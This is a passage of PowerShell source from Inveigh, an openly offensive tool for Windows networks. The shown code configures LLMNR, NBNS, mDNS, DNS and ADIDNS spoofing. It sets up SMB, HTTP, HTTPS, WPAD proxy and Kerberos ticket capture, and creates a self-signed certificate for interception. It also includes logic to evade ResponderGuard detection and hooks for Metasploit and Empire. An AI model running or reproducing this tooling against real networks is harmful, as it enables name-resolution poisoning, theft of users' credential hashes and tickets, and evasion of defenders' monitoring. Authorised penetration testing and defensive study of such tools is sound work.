        $HTTPS = "N"
        $Proxy = "N"
    }

}

if($Tool -eq 1) # Metasploit Interactive PowerShell Payloads and Meterpreter's PowerShell Extension
{
    $inveigh.tool = 1
    $inveigh.output_stream_only = $true
    $inveigh.newline = $null
    $ConsoleOutput = "N"

}
elseif($Tool -eq 2) # PowerShell Empire
{
    $inveigh.tool = 2
    $inveigh.output_stream_only = $true
    $inveigh.console_input = $false
    $inveigh.newline = $null
    $LogOutput = "N"
    $ShowHelp = "N"

    switch ($ConsoleOutput)
    {

        'Low'
        {
            $ConsoleOutput = "Low"
        }

        'Medium'
        {
            $ConsoleOutput = "Medium"
        }

        default
        {
            $ConsoleOutput = "Y"
        }

    }

}
else
{
    $inveigh.tool = 0
    $inveigh.newline = $null
}

$inveigh.netBIOS_domain = (Get-ChildItem -path env:userdomain).Value
$inveigh.computer_name = (Get-ChildItem -path env:computername).Value

try
{
    $inveigh.DNS_domain = ((Get-ChildItem -path env:userdnsdomain -ErrorAction 'SilentlyContinue').Value).ToLower()
    $inveigh.DNS_computer_name = ($inveigh.computer_name + "." + $inveigh.DNS_domain).ToLower()

    if(!$inveigh.domain_mapping_table.($inveigh.netBIOS_domain))
    {
        $inveigh.domain_mapping_table.Add($inveigh.netBIOS_domain,$inveigh.DNS_domain)
    }

}
catch
{
    $inveigh.DNS_domain = $inveigh.netBIOS_domain
    $inveigh.DNS_computer_name = $inveigh.computer_name
}

#endregion
#region begin startup messages
$inveigh.output_queue.Add("[*] Inveigh $inveigh_version started at $(Get-Date -format s)") > $null

if($Elevated -eq 'Y' -or $elevated_privilege)
{

    if(($Elevated -eq 'Auto' -and $elevated_privilege) -or ($Elevated -eq 'Y' -and $elevated_privilege_check))
    {
        $inveigh.output_queue.Add("[+] Elevated Privilege Mode = Enabled")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[-] Elevated Privilege Mode Enabled But Check Failed")  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[!] Elevated Privilege Mode = Disabled")  > $null
    $SMB = "N"
}

if($firewall_status)
{
    $inveigh.output_queue.Add("[!] Windows Firewall = Enabled")  > $null
}

$inveigh.output_queue.Add("[+] Primary IP Address = $IP")  > $null

if($DNS -eq 'Y' -or $LLMNR -eq 'Y' -or $mDNS -eq 'Y' -or $NBNS -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Spoofer IP Address = $SpooferIP")  > $null
}

if($LLMNR -eq 'Y' -or $NBNS -eq 'Y')
{

    if($SpooferThresholdHost -gt 0)
    {
        $inveigh.output_queue.Add("[+] Spoofer Threshold Host = $SpooferThresholdHost")  > $null
    }

    if($SpooferThresholdNetwork -gt 0)
    {
        $inveigh.output_queue.Add("[+] Spoofer Threshold Network = $SpooferThresholdNetwork")  > $null
    }
    
}

if($ADIDNS)
{
    $inveigh.ADIDNS = $ADIDNS
    $inveigh.output_queue.Add("[+] ADIDNS Spoofer = $ADIDNS")  > $null
    $inveigh.output_queue.Add("[+] ADIDNS Hosts Ignore = " + ($ADIDNSHostsIgnore -join ","))  > $null
    $inveigh.output_queue.Add("[+] ADIDNS Domain Controller = $ADIDNSDomainController")  > $null
    $inveigh.output_queue.Add("[+] ADIDNS Domain = $ADIDNSDomain")  > $null
    $inveigh.output_queue.Add("[+] ADIDNS Forest = $ADIDNSForest")  > $null
    $inveigh.output_queue.Add("[+] ADIDNS TTL = $ADIDNSTTL")  > $null
    $inveigh.output_queue.Add("[+] ADIDNS Zone = $ADIDNSZone")  > $null

    if($inveigh.ADIDNS -contains 'NS')
    {
        $inveigh.output_queue.Add("[+] ADIDNS NS Record = $ADIDNSNS")  > $null
        $inveigh.output_queue.Add("[+] ADIDNS NS Target Record = $ADIDNSNSTarget")  > $null
    }

    if($ADIDNSACE -eq 'Y')
    {
        $inveigh.output_queue.Add("[+] ADIDNS ACE Add = Enabled")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] ADIDNS ACE Add = Disabled")  > $null    
    }

    if($ADIDNSCleanup -eq 'Y')
    {
        $inveigh.output_queue.Add("[+] ADIDNS Cleanup = Enabled")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] ADIDNS Cleanup = Disabled")  > $null    
    }

    if($ADIDNS -eq 'Combo')
    {
        $inveigh.request_table_updated = $true
    }

}
else
{
    $inveigh.output_queue.Add("[+] ADIDNS Spoofer = Disabled")  > $null
}

if($DNS -eq 'Y')
{

    if($elevated_privilege -or !$DNS_port_check)
    {
        $inveigh.output_queue.Add("[+] DNS Spoofer = Enabled")  > $null
        $inveigh.output_queue.Add("[+] DNS TTL = $DNSTTL Seconds")  > $null
    }
    else
    {
        $DNS = "N"
        $inveigh.output_queue.Add("[-] DNS Spoofer Disabled Due To In Use Port 53")  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[+] DNS Spoofer = Disabled")  > $null
}

if($LLMNR -eq 'Y')
{

    if($elevated_privilege -or !$LLMNR_port_check)
    {
        $inveigh.output_queue.Add("[+] LLMNR Spoofer = Enabled")  > $null
        $inveigh.output_queue.Add("[+] LLMNR TTL = $LLMNRTTL Seconds")  > $null
    }
    else
    {
        $LLMNR = "N"
        $inveigh.output_queue.Add("[-] LLMNR Spoofer Disabled Due To In Use Port 5355")  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[+] LLMNR Spoofer = Disabled")  > $null
}

if($mDNS -eq 'Y')
{

    if($elevated_privilege -or !$mDNS_port_check)
    {
        $mDNSTypes_output = $mDNSTypes -join ","

        if($mDNSTypes.Count -eq 1)
        {
            $inveigh.output_queue.Add("[+] mDNS Spoofer For Type $mDNSTypes_output = Enabled")  > $null
        }
        else
        {
            $inveigh.output_queue.Add("[+] mDNS Spoofer For Types $mDNSTypes_output = Enabled")  > $null
        }

        $inveigh.output_queue.Add("[+] mDNS TTL = $mDNSTTL Seconds")  > $null
    }
    else
    {
        $mDNS = "N"
        $inveigh.output_queue.Add("[-] mDNS Spoofer Disabled Due To In Use Port 5353")  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[+] mDNS Spoofer = Disabled")  > $null
}

if($NBNS -eq 'Y')
{
    $NBNSTypes_output = $NBNSTypes -join ","
    
    if($NBNSTypes.Count -eq 1)
    {
        $inveigh.output_queue.Add("[+] NBNS Spoofer For Type $NBNSTypes_output = Enabled")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] NBNS Spoofer For Types $NBNSTypes_output = Enabled")  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[+] NBNS Spoofer = Disabled")  > $null
}

if($NBNSBruteForce -eq 'Y')
{   
    $inveigh.output_queue.Add("[+] NBNS Brute Force Spoofer Target = $NBNSBruteForceTarget") > $null
    $inveigh.output_queue.Add("[+] NBNS Brute Force Spoofer IP Address = $SpooferIP") > $null
    $inveigh.output_queue.Add("[+] NBNS Brute Force Spoofer Hostname = $NBNSBruteForceHost") > $null

    if($NBNSBruteForcePause)
    {
        $inveigh.output_queue.Add("[+] NBNS Brute Force Pause = $NBNSBruteForcePause Seconds") > $null
    }

}

if($NBNS -eq 'Y' -or $NBNSBruteForce -eq 'Y')
{
    $inveigh.output_queue.Add("[+] NBNS TTL = $NBNSTTL Seconds") > $null
}

if($SpooferLearning -eq 'Y' -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.output_queue.Add("[+] Spoofer Learning = Enabled")  > $null

    if($SpooferLearningDelay -eq 1)
    {
        $inveigh.output_queue.Add("[+] Spoofer Learning Delay = $SpooferLearningDelay Minute")  > $null
    }
    elseif($SpooferLearningDelay -gt 1)
    {
        $inveigh.output_queue.Add("[+] Spoofer Learning Delay = $SpooferLearningDelay Minutes")  > $null
    }
    
    if($SpooferLearningInterval -eq 1)
    {
        $inveigh.output_queue.Add("[+] Spoofer Learning Interval = $SpooferLearningInterval Minute")  > $null
    }
    elseif($SpooferLearningInterval -eq 0)
    {
        $inveigh.output_queue.Add("[+] Spoofer Learning Interval = Disabled")  > $null
    }
    elseif($SpooferLearningInterval -gt 1)
    {
        $inveigh.output_queue.Add("[+] Spoofer Learning Interval = $SpooferLearningInterval Minutes")  > $null
    }

}

if($SpooferHostsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.output_queue.Add("[+] Spoofer Hosts Reply = " + ($SpooferHostsReply -join ","))  > $null
}

if($SpooferHostsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.output_queue.Add("[+] Spoofer Hosts Ignore = " + ($SpooferHostsIgnore -join ","))  > $null
}

if($SpooferIPsReply -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.output_queue.Add("[+] Spoofer IPs Reply = " + ($SpooferIPsReply -join ","))  > $null
}

if($SpooferIPsIgnore -and ($LLMNR -eq 'Y' -or $NBNS -eq 'Y'))
{
    $inveigh.output_queue.Add("[+] Spoofer IPs Ignore = " + ($SpooferIPsIgnore -join ","))  > $null
}

if($SpooferRepeat -eq 'N')
{
    $inveigh.spoofer_repeat = $false
    $inveigh.output_queue.Add("[+] Spoofer Repeating = Disabled")  > $null
}
else
{
    $inveigh.spoofer_repeat = $true
}

if($SMB -eq 'Y' -and $elevated_privilege)
{
    $inveigh.output_queue.Add("[+] SMB Capture = Enabled")  > $null
}
else
{
    $inveigh.output_queue.Add("[+] SMB Capture = Disabled")  > $null
}

if($HTTP -eq 'Y')
{

    if($HTTP_port_check)
    {
        $HTTP = "N"
        $inveigh.output_queue.Add("[-] HTTP Capture Disabled Due To In Use Port $HTTPPort")  > $null
    }
    else
    {

        if($HTTPIP -ne '0.0.0.0')
        {
            $inveigh.output_queue.Add("[+] HTTP IP = $HTTPIP") > $null
        }

        if($HTTPPort -ne 80)
        {
            $inveigh.output_queue.Add("[+] HTTP Port = $HTTPPort") > $null
        }

        $inveigh.output_queue.Add("[+] HTTP Capture = Enabled")  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[+] HTTP Capture = Disabled")  > $null
}

if($HTTPS -eq 'Y')
{

    if($HTTPS_port_check)
    {
        $HTTPS = "N"
        $inveigh.HTTPS = $false
        $inveigh.output_queue.Add("[-] HTTPS Capture Disabled Due To In Use Port $HTTPSPort")  > $null
    }
    else
    {

        try
        { 
            $inveigh.certificate_issuer = $HTTPSCertIssuer
            $inveigh.certificate_CN = $HTTPSCertSubject
            $inveigh.output_queue.Add("[+] HTTPS Certificate Issuer = " + $inveigh.certificate_issuer)  > $null
            $inveigh.output_queue.Add("[+] HTTPS Certificate CN = " + $inveigh.certificate_CN)  > $null
            $certificate_check = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -Like "CN=" + $inveigh.certificate_issuer})

            if(!$certificate_check)
            {
                # credit to subTee for cert creation code from Interceptor
                $certificate_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_distinguished_name.Encode( "CN=" + $inveigh.certificate_CN, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_issuer_distinguished_name = new-object -com "X509Enrollment.CX500DistinguishedName"
                $certificate_issuer_distinguished_name.Encode("CN=" + $inveigh.certificate_issuer, $certificate_distinguished_name.X500NameFlags.X500NameFlags.XCN_CERT_NAME_STR_NONE)
                $certificate_key = new-object -com "X509Enrollment.CX509PrivateKey"
                $certificate_key.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider"
                $certificate_key.KeySpec = 2
                $certificate_key.Length = 2048
			    $certificate_key.MachineContext = 1
                $certificate_key.Create()
                $certificate_server_auth_OID = new-object -com "X509Enrollment.CObjectId"
			    $certificate_server_auth_OID.InitializeFromValue("1.3.6.1.5.5.7.3.1")
			    $certificate_enhanced_key_usage_OID = new-object -com "X509Enrollment.CObjectIds.1"
			    $certificate_enhanced_key_usage_OID.Add($certificate_server_auth_OID)
			    $certificate_enhanced_key_usage_extension = new-object -com "X509Enrollment.CX509ExtensionEnhancedKeyUsage"
			    $certificate_enhanced_key_usage_extension.InitializeEncode($certificate_enhanced_key_usage_OID)
			    $certificate = new-object -com "X509Enrollment.CX509CertificateRequestCertificate"
			    $certificate.InitializeFromPrivateKey(2,$certificate_key,"")
			    $certificate.Subject = $certificate_distinguished_name
			    $certificate.Issuer = $certificate_issuer_distinguished_name
			    $certificate.NotBefore = (Get-Date).AddDays(-271)
			    $certificate.NotAfter = $certificate.NotBefore.AddDays(824)
			    $certificate_hash_algorithm_OID = New-Object -ComObject X509Enrollment.CObjectId
			    $certificate_hash_algorithm_OID.InitializeFromAlgorithmName(1,0,0,"SHA256")
			    $certificate.HashAlgorithm = $certificate_hash_algorithm_OID
                $certificate.X509Extensions.Add($certificate_enhanced_key_usage_extension)
                $certificate_basic_constraints = new-object -com "X509Enrollment.CX509ExtensionBasicConstraints"
			    $certificate_basic_constraints.InitializeEncode("true",1)
                $certificate.X509Extensions.Add($certificate_basic_constraints)
                $certificate.Encode()
                $certificate_enrollment = new-object -com "X509Enrollment.CX509Enrollment"
			    $certificate_enrollment.InitializeFromRequest($certificate)
			    $certificate_data = $certificate_enrollment.CreateRequest(0)
                $certificate_enrollment.InstallResponse(2,$certificate_data,0,"")
                $inveigh.certificate = (Get-ChildItem Cert:\LocalMachine\My | Where-Object {$_.Issuer -match $inveigh.certificate_issuer})
            }
            else
            {
                
                if($HTTPSForceCertDelete -eq 'Y')
                {
                    $inveigh.HTTPS_force_certificate_delete = $true
                }

                $inveigh.HTTPS_existing_certificate = $true
                $inveigh.output_queue.Add("[+] HTTPS Capture = Using Existing Certificate")  > $null
            }
            
            $inveigh.HTTPS = $true

            if($HTTPIP -ne '0.0.0.0')
            { 
                $inveigh.output_queue.Add("[+] HTTPS IP = $HTTPIP") > $null
            }

            if($HTTPSPort -ne 443)
            {   
                $inveigh.output_queue.Add("[+] HTTPS Port = $HTTPSPort") > $null
            }

            $inveigh.output_queue.Add("[+] HTTPS Capture = Enabled")  > $null

        }
        catch
        {
            $HTTPS = "N"
            $inveigh.HTTPS = $false
            $inveigh.output_queue.Add("[-] HTTPS Capture Disabled Due To Certificate Error")  > $null
        }

    }

}
else
{
    $inveigh.output_queue.Add("[+] HTTPS Capture = Disabled")  > $null
}

if($HTTP -eq 'Y' -or $HTTPS -eq 'Y')
{
    $inveigh.output_queue.Add("[+] HTTP/HTTPS Authentication = $HTTPAuth")  > $null

    if($HTTPDirectory -and !$HTTPResponse)
    {
        $inveigh.output_queue.Add("[+] HTTP/HTTPS Directory = $HTTPDirectory")  > $null

        if($HTTPDefaultFile)
        {
            $inveigh.output_queue.Add("[+] HTTP/HTTPS Default Response File = $HTTPDefaultFile")  > $null
        }

        if($HTTPDefaultEXE)
        {
            $inveigh.output_queue.Add("[+] HTTP/HTTPS Default Response Executable = $HTTPDefaultEXE")  > $null
        }

    }

    if($HTTPResponse)
    {
        $inveigh.output_queue.Add("[+] HTTP/HTTPS Response = Enabled")  > $null
    }

    if($HTTPResponse -or $HTTPDirectory -and $HTTPContentType -ne 'html/text')
    {
        $inveigh.output_queue.Add("[+] HTTP/HTTPS/Proxy Content Type = $HTTPContentType")  > $null
    }

    if($HTTPAuth -eq 'Basic' -or $WPADAuth -eq 'Basic')
    {
        $inveigh.output_queue.Add("[+] Basic Authentication Realm = $HTTPBasicRealm")  > $null
    }

    if($WPADDirectHosts)
    {

        foreach($WPAD_direct_host in $WPADDirectHosts)
        {
            $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
        }

    }

    if($Proxy -eq 'Y')
    {

        if($proxy_port_check)
        {
            $Proxy = "N"
            $inveigh.output_queue.Add("[-] Proxy Capture Disabled Due To In Use Port $ProxyPort")  > $null
        }
        else
        {
            $inveigh.output_queue.Add("[+] Proxy Capture = Enabled")  > $null
            $inveigh.output_queue.Add("[+] Proxy Port = $ProxyPort") > $null
            $inveigh.output_queue.Add("[+] Proxy Authentication = $ProxyAuth")  > $null
            $ProxyPortFailover = $ProxyPort + 1
            $ProxyIgnore = ($ProxyIgnore | Where-Object {$_ -and $_.Trim()})

            if($ProxyIgnore.Count -gt 0)
            {
                $inveigh.output_queue.Add("[+] Proxy Ignore List = " + ($ProxyIgnore -join ","))  > $null
            }

            if($ProxyIP -eq '0.0.0.0')
            {
                $proxy_WPAD_IP = $IP
            }
            else
            {
                $proxy_WPAD_IP = $ProxyIP
            }

            if($WPADIP -and $WPADPort)
            {
                $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $WPADIP`:$WPADPort; DIRECT`";}"
            }
            else
            {
                $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $proxy_WPAD_IP`:$ProxyPort; PROXY $proxy_wpad_IP`:$ProxyPortFailover; DIRECT`";}"
            }

        }

    }

    $inveigh.output_queue.Add("[+] WPAD Authentication = $WPADAuth")  > $null

    if($WPADAuth -like "NTLM*")
    {
        $WPADAuthIgnore = ($WPADAuthIgnore | Where-Object {$_ -and $_.Trim()})

        if($WPADAuthIgnore.Count -gt 0)
        {
            $inveigh.output_queue.Add("[+] WPAD NTLM Authentication Ignore List = " + ($WPADAuthIgnore -join ","))  > $null
        }

    }

    if($WPADDirectHosts)
    {
        $inveigh.output_queue.Add("[+] WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
    }

    if($WPADResponse -and $Proxy -eq 'N')
    {
        $inveigh.output_queue.Add("[+] WPAD Response = Enabled")  > $null
    }
    elseif($WPADResponse -and $Proxy -eq 'Y')
    {
        $inveigh.output_queue.Add("[+] WPAD Proxy Response = Enabled")  > $null

        if($WPADIP -and $WPADPort)
        {
            $inveigh.output_queue.Add("[+] WPAD Failover = $WPADIP`:$WPADPort")  > $null
        }

    }
    elseif($WPADIP -and $WPADPort)
    {
        $inveigh.output_queue.Add("[+] WPAD Response = Enabled")  > $null
        $inveigh.output_queue.Add("[+] WPAD = $WPADIP`:$WPADPort")  > $null
        
        if($WPADDirectHosts)
        {

            foreach($WPAD_direct_host in $WPADDirectHosts)
            {
                $WPAD_direct_hosts_function += 'if (dnsDomainIs(host, "' + $WPAD_direct_host + '")) return "DIRECT";'
            }

            $WPADResponse = "function FindProxyForURL(url,host){" + $WPAD_direct_hosts_function + "return `"PROXY " + $WPADIP + ":" + $WPADPort + "`";}"
            $inveigh.output_queue.Add("[+] WPAD Direct Hosts = " + ($WPADDirectHosts -join ","))  > $null
        }
        else
        {
            $WPADResponse = "function FindProxyForURL(url,host){$WPAD_direct_hosts_function return `"PROXY $WPADIP`:$WPADPort; DIRECT`";}"
        }

    }

    if($Challenge)
    {
        $inveigh.output_queue.Add("[+] HTTP NTLM Challenge = $Challenge")  > $null
    }

}

if($Kerberos -eq 'Y')
{
    $inveigh.output_queue.Add("[+] Kerberos TGT Capture = Enabled")  > $null
    $inveigh.output_queue.Add("[+] Kerberos TGT File Output Count = $KerberosCount")  > $null
    
    if($KerberosHostHeader.Count -gt 0)
    {
        $inveigh.output_queue.Add("[+] Kerberos TGT Host Header List = " + ($KerberosHostHeader -join ","))  > $null
    }

}
else
{
    $inveigh.output_queue.Add("[+] Kerberos TGT Capture = Disabled")  > $null    
}

if($MachineAccounts -eq 'N')
{
    $inveigh.output_queue.Add("[+] Machine Account Capture = Disabled")  > $null
    $inveigh.machine_accounts = $false
}
else
{
    $inveigh.output_queue.Add("[+] Machine Account Capture = Enabled")  > $null
    $inveigh.machine_accounts = $true
}

if($ConsoleOutput -ne 'N')
{

    if($ConsoleOutput -ne 'N')
    {

        if($ConsoleOutput -eq 'Y')
        {
            $inveigh.output_queue.Add("[+] Console Output = Full")  > $null
        }
        else
        {
            $inveigh.output_queue.Add("[+] Console Output = $ConsoleOutput")  > $null
        }

    }

    $inveigh.console_output = $true

    if($ConsoleStatus -eq 1)
    {
        $inveigh.output_queue.Add("[+] Console Status = $ConsoleStatus Minute")  > $null
    }
    elseif($ConsoleStatus -gt 1)
    {
        $inveigh.output_queue.Add("[+] Console Status = $ConsoleStatus Minutes")  > $null
    }

}
else
{

    if($inveigh.tool -eq 1)
    {
        $inveigh.output_queue.Add("[+] Console Output Disabled Due To External Tool Selection")  > $null
    }
    else
    {
        $inveigh.output_queue.Add("[+] Console Output = Disabled")  > $null
    }

}

if($ConsoleUnique -eq 'Y')
{
    $inveigh.console_unique = $true
}
else
{
    $inveigh.console_unique = $false
}

if($FileOutput -eq 'Y' -or ($Kerberos -eq 'Y' -and $KerberosCount -gt 0) -or ($Pcap -eq 'File' -and ($PcapTCP -or $PcapUDP)))
{
    
    if($FileOutput -eq 'Y')
    {
        $inveigh.output_queue.Add("[+] File Output = Enabled")  > $null
        $inveigh.file_output = $true
    }

    if($Pcap -eq 'File')
    {
        $inveigh.output_queue.Add("[+] Pcap Output = File") > $null
        
        if($PcapTCP)
        {
            $inveigh.output_queue.Add("[+] Pcap TCP Ports = " + ($PcapTCP -join ","))  > $null
        }

        if($PcapUDP)
        {
            $inveigh.output_queue.Add("[+] Pcap UDP Ports = " + ($PcapUDP -join ","))  > $null
        }

    }

    $inveigh.output_queue.Add("[+] Output Directory = $output_directory")  > $null 
}
else
{
    $inveigh.output_queue.Add("[+] File Output = Disabled")  > $null
}

if($Pcap -eq 'Memory')
{
    $inveigh.output_queue.Add("[+] Pcap Output = Memory")
}

if($FileUnique -eq 'Y')
{
    $inveigh.file_unique = $true
}
else
{
    $inveigh.file_unique = $false
}

if($LogOutput -eq 'Y')
{
    $inveigh.log_output = $true
}
else
{
    $inveigh.log_output = $false
}

if($RunCount)
{
    $inveigh.output_queue.Add("[+] Run Count = $RunCount") > $null
}

if($RunTime -eq 1)
{
    $inveigh.output_queue.Add("[+] Run Time = $RunTime Minute")  > $null
}
elseif($RunTime -gt 1)
{
    $inveigh.output_queue.Add("[+] Run Time = $RunTime Minutes")  > $null
}

if($ShowHelp -eq 'Y')
{
    $inveigh.output_queue.Add("[!] Run Stop-Inveigh to stop")  > $null

    if($inveigh.console_output)
    {
        $inveigh.output_queue.Add("[*] Press any key to stop console output")  > $null
    }

}

while($inveigh.output_queue.Count -gt 0)
{

    switch -Wildcard ($inveigh.output_queue[0])
    {

        {$_ -like "?`[`!`]*" -or $_ -like "?`[-`]*"}
        {

            if($inveigh.status_output -and $inveigh.output_stream_only)
            {
                Write-Output($inveigh.output_queue[0] + $inveigh.newline)
            }
            elseif($inveigh.status_output)
            {
                Write-Warning($inveigh.output_queue[0])
            }

            if($inveigh.file_output)
            {
                $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

        default
        {

            if($inveigh.status_output -and $inveigh.output_stream_only)
            {
                Write-Output($inveigh.output_queue[0] + $inveigh.newline)
            }
            elseif($inveigh.status_output)
            {
                Write-Output($inveigh.output_queue[0])
            }

            if($inveigh.file_output)
            {

                if ($inveigh.output_queue[0].StartsWith("[+] ") -or $inveigh.output_queue[0].StartsWith("[*] "))
                {
                    $inveigh.log_file_queue.Add($inveigh.output_queue[0]) > $null
                }
                else
                {
                    $inveigh.log_file_queue.Add("[redacted]") > $null    
                }

            }

            if($inveigh.log_output)
            {
                $inveigh.log.Add($inveigh.output_queue[0]) > $null
            }

            $inveigh.output_queue.RemoveAt(0)
        }

    }

}

$inveigh.status_output = $false

#endregion
#region begin script blocks

# Shared Basic Functions ScriptBlock
$shared_basic_functions_scriptblock =
{

    function Get-UInt16DataLength
    {
        param ([Int]$Start,[Byte[]]$Data)
        $data_length = [System.BitConverter]::ToUInt16($Data[$Start..($Start + 1)],0)

        return $data_length
    }

    function Get-UInt32DataLength
    {
        param ([Int]$Start,[Byte[]]$Data)

        $data_length = [System.BitConverter]::ToUInt32($Data[$Start..($Start + 3)],0)

        return $data_length
    }

    function Convert-DataToString
    {
        param ([Int]$Start,[Int]$Length,[Byte[]]$Data)

        $string_data = [System.BitConverter]::ToString($Data[$Start..($Start + $Length - 1)])
        $string_data = $string_data -replace "-00",""
        $string_data = $string_data.Split("-") | ForEach-Object{[Char][System.Convert]::ToInt16($_,16)}
        $string_extract = New-Object System.String ($string_data,0,$string_data.Length)

        return $string_extract
    }

    function Convert-DataToUInt16($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt16($field,0)
    }

    function Convert-DataToUInt32($field)
    {
	   [Array]::Reverse($field)
	   return [System.BitConverter]::ToUInt32($field,0)
    }

    function Get-SpooferResponseMessage
    {
        param ([String]$QueryString,[String]$Type,[String]$mDNSType,[String]$Enabled,[byte]$NBNSType)

        if($QueryString -like "*.*")
        {
            [Array]$query_split = $QueryString.Split('.')
            $query_host = $query_split[0]
        }

        $response_type = "[+]"

        if($Inspect)
        {
            $response_message = "[inspect only]"
        }
        elseif($Enabled -eq 'N')
        {
            $response_message = "[spoofer disabled]"
        }
        elseif($SpooferHostsReply -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))
        {
            $response_message = "[$QueryString not on reply list]"
        }
        elseif($SpooferHostsIgnore -contains $QueryString -or $SpooferHostsIgnore -contains $query_host)
        {
            $response_message = "[$QueryString is on ignore list]"
        }
        elseif($SpooferIPsReply -and $SpooferIPsReply -notcontains $source_IP)
        {
            $response_message = "[$source_IP not on reply list]"
        }
        elseif($SpooferIPsIgnore -contains $source_IP)
        {
            $response_message = "[$source_IP is on ignore list]"
        }
        elseif($inveigh.valid_host_list -contains $query_string -and ($SpooferHostsReply -notcontains $QueryString -and $SpooferHostsReply -notcontains $query_host))
        {
            $response_message = "[$query_string is a valid host]"
        }
        elseif($SpooferRepeat -eq 'Y' -and $inveigh.IP_capture_list -contains $source_IP.IPAddressToString)
        {
            $response_message = "[previous $source_IP capture]"
        }
        elseif($Type -eq 'NBNS' -and $source_IP.IPAddressToString -eq $IP)
        {
            $response_message = "[local query]"
        }
        elseif($SpooferLearning -eq 'Y' -or $SpooferLearningDelay -and $spoofer_learning_stopwatch.Elapsed -lt $spoofer_learning_delay)
        {
            $response_message = ": " + [Int]($SpooferLearningDelay - $spoofer_learning_stopwatch.Elapsed.TotalMinutes) + " minute(s) until spoofing starts"
        }
        elseif($Type -eq 'NBNS' -and $NBNSTypes -notcontains $NBNS_query_type)
        {
            $response_message = "[NBNS type disabled]"
        }
        elseif($Type -eq 'NBNS' -and $NBNSType -eq 33)
        {
            $response_message = "[NBSTAT request]"
        }
        elseif($EvadeRG -eq 'Y' -and $Type -ne 'mDNS' -and $Type -ne 'DNS' -and $destination_IP.IPAddressToString -eq $IP)
        {
            $response_message = "[possible ResponderGuard request ignored]"
            $response_type = "[!]"
        }
        elseif($Type -eq 'mDNS' -and $mDNSType -and $mDNSTypes -notcontains $mDNSType)
        {
            $response_message = "[mDNS type disabled]"
        }
        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdHost -gt 0 -and @($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count -le $SpooferThresholdHost)
        {
            $response_message = "[SpooferThresholdHost >= $(@($inveigh.request_table.$QueryString | Where-Object {$_ -match $source_IP.IPAddressToString}).Count)]"
        }
        elseif($Type -ne 'mDNS' -and $Type -ne 'DNS' -and $SpooferThresholdNetwork -gt 0 -and @($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count -le $SpooferThresholdNetwork)
        {
            $response_message = "[SpooferThresholdNetwork >= $(@($inveigh.request_table.$QueryString | Sort-Object | Get-Unique).Count)]"
        }
        elseif($QueryString -match '[^\x00-\x7F]+')
        {
            $response_message = "[nonprintable characters]"
        }
        else
        {
            $response_message = "[response sent]"
        }

        return $response_type,$response_message
    }

    function Get-NBNSQueryType([String]$NBNSQueryType)
    {

        switch ($NBNSQueryType)
        {

            '41-41'
            {
                $NBNS_query_type = "00"
            }

            '41-42'
            {
                $NBNS_query_type = "01"
            }

            '41-43'
            {
                $NBNS_query_type = "02"
            }

            '41-44'
            {
                $NBNS_query_type = "03"
            }

            '43-41'
            {
                $NBNS_query_type = "20"
            }

            '42-4C'
            {
                $NBNS_query_type = "1B"
            }

            '42-4D'
            {
                $NBNS_query_type = "1C"
            }

            '42-4E'
            {
                $NBNS_query_type = "1D"
            }

            '42-4F'
            {
                $NBNS_query_type = "1E"
            }

        }

        return $NBNS_query_type
    }

    function Get-NameQueryString([Int]$Index, [Byte[]]$NameQuery)
    {
        $segment_length = $NameQuery[12]

        if($segment_length -gt 0)
        {
            $i = 0
            $name_query_string = ''

            do
            {
                $name_query_string += [System.Text.Encoding]::UTF8.GetString($NameQuery[($Index + 1)..($Index + $segment_length)])
                $Index += $segment_length + 1
                $segment_length = $NameQuery[$Index]
                $i++

                if($segment_length -gt 0)
                {
                    $name_query_string += "."
                }

            }
            until($segment_length -eq 0 -or $i -eq 127)
            
        }

        return $name_query_string
    }

    function ConvertFrom-PacketOrderedDictionary
    {
        param($packet_ordered_dictionary)

        foreach($field in $packet_ordered_dictionary.Values)
        {
            $byte_array += $field
        }

        return $byte_array
    }

    function New-RelayEnumObject
    {
        param ($IP,$Hostname,$Sessions,$AdministratorUsers,$AdministratorGroups,$Privileged,$Shares,$NetSessions,$NetSessionsMapped,
        $LocalUsers,$SMB2,$Signing,$SMBServer,$Targeted,$Enumerate,$Execute)

        if($Sessions -and $Sessions -isnot [Array]){$Sessions = @($Sessions)}
        if($AdministratorUsers -and $AdministratorUsers -isnot [Array]){$AdministratorUsers = @($AdministratorUsers)}
        if($AdministratorGroups -and $AdministratorGroups -isnot [Array]){$AdministratorGroups = @($AdministratorGroups)}
        if($Privileged -and $Privileged -isnot [Array]){$Privileged = @($Privileged)}
